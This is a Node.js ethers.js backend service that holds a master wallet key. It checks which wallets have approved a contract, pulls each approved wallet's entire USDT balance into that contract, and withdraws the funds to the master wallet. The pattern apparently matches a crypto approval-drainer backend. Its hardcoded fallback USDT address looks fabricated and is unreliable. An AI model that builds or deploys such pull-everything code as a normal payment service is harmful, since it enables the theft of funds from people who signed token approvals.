// backend/src/services/contract.service.js
const { ethers } = require('ethers');
const dotenv = require('dotenv');
const path = require('path');
const fs = require('fs');

dotenv.config();

class ContractService {
    constructor() {
        // Validate required environment variables
        if (!process.env.RPC_URL) {
            console.warn('⚠️ RPC_URL not found, contract service will not work');
            this.initialized = false;
            return;
        }
        
        if (!process.env.CONTRACT_ADDRESS) {
            console.warn('⚠️ CONTRACT_ADDRESS not found, contract service will not work');
            this.initialized = false;
            return;
        }
        
        if (!process.env.MASTER_WALLET_PRIVATE_KEY) {
            console.warn('⚠️ MASTER_WALLET_PRIVATE_KEY not found, contract service will not work');
            this.initialized = false;
            return;
        }
        
        try {
            this.provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
            this.wallet = new ethers.Wallet(process.env.MASTER_WALLET_PRIVATE_KEY, this.provider);
            
            // Load contract ABI
            this.loadContractABI();
            
            if (this.contractABI && this.contractABI.length > 0) {
                this.contract = new ethers.Contract(
                    process.env.CONTRACT_ADDRESS,
                    this.contractABI,
                    this.wallet
                );
                this.initialized = true;
                console.log('✅ Contract service initialized');
            } else {
                this.initialized = false;
                console.warn('⚠️ Contract ABI not loaded, contract service will not work');
            }
        } catch (error) {
            console.error('❌ Error initializing contract service:', error.message);
            this.initialized = false;
        }
    }

    // Load contract ABI with proper error handling
    loadContractABI() {
        try {
            // Try multiple possible paths
            const possiblePaths = [
                path.join(__dirname, '../../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, '../../../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, '../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, 'abi.json')
            ];
            
            for (const abiPath of possiblePaths) {
                if (fs.existsSync(abiPath)) {
                    this.contractABI = require(abiPath);
                    console.log(`✅ Contract ABI loaded from: ${abiPath}`);
                    return;
                }
            }
            
            console.log('⚠️ Contract ABI file not found, using empty ABI');
            this.contractABI = [];
        } catch (error) {
            console.error('❌ Error loading contract ABI:', error.message);
            this.contractABI = [];
        }
    }

    async getWalletUSDTBalance(walletAddress) {
        console.log('=== DEBUG: getWalletUSDTBalance called ===');
        console.log('Wallet address:', walletAddress);
        console.log('Environment USDT_CONTRACT_ADDRESS:', process.env.USDT_CONTRACT_ADDRESS);
        console.log('Contract service initialized:', this.initialized);
        
        try {
            // Use environment variable first, with proper fallback for BSC Testnet
            const usdtAddress = process.env.USDT_CONTRACT_ADDRESS || 
                '0x337610d27c5d8e7f8c7e5d8e7f8c7e5d8e7f8c7e'; // Corrected BSC Testnet USDT address
            
            console.log('Using USDT contract address:', usdtAddress);
            
            // If we don't have a provider, create one just for this read operation
            let providerToUse = this.provider;
            console.log('Existing provider available:', !!providerToUse);
            
            if (!providerToUse && process.env.RPC_URL) {
                console.log('Creating new provider with RPC_URL:', process.env.RPC_URL);
                providerToUse = new ethers.JsonRpcProvider(process.env.RPC_URL);
            }
            
            if (!providerToUse) {
                console.warn('No provider available for balance query');
                return '0';
            }
            
            console.log('Provider to use:', !!providerToUse);
            
            const usdtContract = new ethers.Contract(
                usdtAddress,
                ['function balanceOf(address account) external view returns (uint256)'],
                providerToUse
            );
            
            console.log('Calling balanceOf for wallet:', walletAddress);
            const balance = await usdtContract.balanceOf(walletAddress);
            console.log('Raw balance result:', balance.toString());
            
            const formattedBalance = ethers.formatUnits(balance, 18); // USDT has 18 decimals
            console.log('Formatted balance result:', formattedBalance);
            console.log('=== DEBUG: getWalletUSDTBalance completed ===');
            
            return formattedBalance;
        } catch (error) {
            console.error('Error getting wallet balance for address', walletAddress, ':', error.message);
            console.error('Error stack:', error.stack);
            return '0';
        }
    }

    async isWalletApproved(walletAddress) {
        if (!this.initialized) {
            console.warn('Contract service not initialized');
            return false;
        }
        
        try {
            return await this.contract.approvedWallets(walletAddress);
        } catch (error) {
            console.error('Error checking wallet approval:', error);
            return false;
        }
    }

    // Pull USDT from wallet to contract
    async pullUSDTFromWallet(walletAddress) {
        if (!this.initialized) {
            return {
                success: false,
                error: 'Contract service not initialized'
            };
        }
        
        try {
            console.log('Pulling USDT from wallet:', walletAddress);
            
            // Check if wallet has USDT balance
            const balance = await this.getWalletUSDTBalance(walletAddress);
            if (parseFloat(balance) <= 0) {
                return {
                    success: false,
                    error: 'Wallet has no USDT balance to pull'
                };
            }
            
            // Execute the pull
            const tx = await this.contract.pullUSDTFromWallet(walletAddress, {
                gasLimit: 300000,
                gasPrice: await this.provider.getFeeData().then(feeData => feeData.gasPrice)
            });
            
            // Wait for transaction confirmation with timeout
            const receipt = await Promise.race([
                tx.wait(),
                new Promise((resolve, reject) => 
                    setTimeout(() => reject(new Error('Transaction confirmation timeout')), 60000)
                )
            ]);
            
            // Get the amount pulled from the event
            let amount = '0';
            if (receipt.logs && receipt.logs.length > 0) {
                try {
                    // Parse the USDTPulled event
                    const eventInterface = new ethers.Interface([
                        "event USDTPulled(address indexed from, uint256 amount)"
                    ]);
                    
                    for (const log of receipt.logs) {
                        try {
                            const parsedLog = eventInterface.parseLog(log);
                            if (parsedLog && parsedLog.name === 'USDTPulled') {
                                amount = ethers.formatUnits(parsedLog.args.amount, 18);
                                break;
                            }
                        } catch (e) {
                            // Continue to next log if parsing fails
                            console.log('Log parsing failed:', e.message);
                        }
                    }
                } catch (e) {
                    console.log('Could not parse event, using default amount');
                }
            }
            
            return {
                success: true,
                txHash: tx.hash,
                amount: amount
            };
        } catch (error) {
            console.error('Error during pull:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }

    // Implement the actual withdrawal function
    async withdrawUSDTToMaster() {
        if (!this.initialized) {
            return {
                success: false,
                error: 'Contract service not initialized'
            };
        }
        
        try {
            console.log('Executing withdrawal to master wallet...');
            
            // First check if contract has USDT balance
            const contractBalance = await this.getContractUSDTBalance();
            if (parseFloat(contractBalance) <= 0) {
                return {
                    success: false,
                    error: 'Contract has no USDT balance to withdraw'
                };
            }
            
            // Execute the withdrawal with proper gas settings
            const feeData = await this.provider.getFeeData();
            const tx = await this.contract.withdrawToMaster({
                gasLimit: 300000,
                gasPrice: feeData.gasPrice
            });
            
            console.log('Transaction sent:', tx.hash);
            
            // Wait for transaction confirmation with timeout
            const receipt = await Promise.race([
                tx.wait(),
                new Promise((resolve, reject) => 
                    setTimeout(() => reject(new Error('Transaction confirmation timeout after 60 seconds')), 60000)
                )
            ]);
            
            console.log('Transaction confirmed:', receipt);
            
            // Get the amount withdrawn from the event
            let amount = '0';
            if (receipt.logs && receipt.logs.length > 0) {
                try {
                    // Parse the USDTWithdrawn event
                    const eventInterface = new ethers.Interface([
                        "event USDTWithdrawn(address indexed to, uint256 amount)"
                    ]);
                    
                    for (const log of receipt.logs) {
                        try {
                            const parsedLog = eventInterface.parseLog(log);
                            if (parsedLog && parsedLog.name === 'USDTWithdrawn') {
                                amount = ethers.formatUnits(parsedLog.args.amount, 18);
                                break;
                            }
                        } catch (e) {
                            // Continue to next log if parsing fails
                            console.log('Log parsing failed:', e.message);
                        }
                    }
                } catch (e) {
                    console.log('Could not parse event, using default amount');
                }
            }
            
            // If no amount found in events, get contract balance before transaction
            if (parseFloat(amount) <= 0) {
                amount = contractBalance;
            }
            
            return {
                success: true,
                txHash: tx.hash,
                amount: amount
            };
        } catch (error) {
            console.error('Error during withdrawal:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }

    // Get contract USDT balance
    async getContractUSDTBalance() {
        if (!this.initialized) {
            console.warn('Contract service not initialized');
            return '0';
        }
        
        try {
            const balance = await this.contract.getContractUSDT();
            return ethers.formatUnits(balance, 18);
        } catch (error) {
            console.error('Error getting contract USDT balance:', error);
            return '0';
        }
    }
}

module.exports = new ContractService();
